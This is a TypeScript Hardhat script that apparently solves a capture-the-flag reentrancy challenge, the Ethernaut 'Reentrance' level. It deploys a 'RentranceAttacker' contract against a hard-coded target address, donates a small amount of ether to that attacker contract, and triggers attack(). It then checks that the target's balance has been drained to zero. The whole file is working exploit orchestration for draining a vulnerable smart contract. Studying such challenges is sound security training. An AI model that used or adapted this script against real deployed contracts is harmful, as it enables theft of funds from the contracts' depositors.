import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/10.Re-entrancy/Reentrance.sol/Reentrance.json";
import { BigNumber, Contract } from "ethers";
import { displayEthBalance } from "../../utils/getEthBalance";

function setTargetContract() {
  const contractAddress = "0x9bd03785862b942d342c652C08f0be50e66150A4";
  return new Contract(contractAddress, abi);
}

async function main() {
  const targetAddr = "0x9bd03785862b942d342c652C08f0be50e66150A4";
  const [attacker] = await ethers.getSigners();

  const ContactFactory = await ethers.getContractFactory("RentranceAttacker");
  const reentrancyAttacker = await ContactFactory.deploy(targetAddr);
  await reentrancyAttacker.deployed();
  const target = setTargetContract();
  await target.connect(attacker).donate(reentrancyAttacker.address, {
    value: ethers.utils.parseEther("0.001"),
  });
  const tx = await reentrancyAttacker
    .connect(attacker)
    .attack(ethers.utils.parseEther("0.001"), { gasLimit: "3000000" });
  await tx.wait();
  const targetBalance = await attacker.provider!.getBalance(targetAddr);
  console.log("Success: ", targetBalance.isZero());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
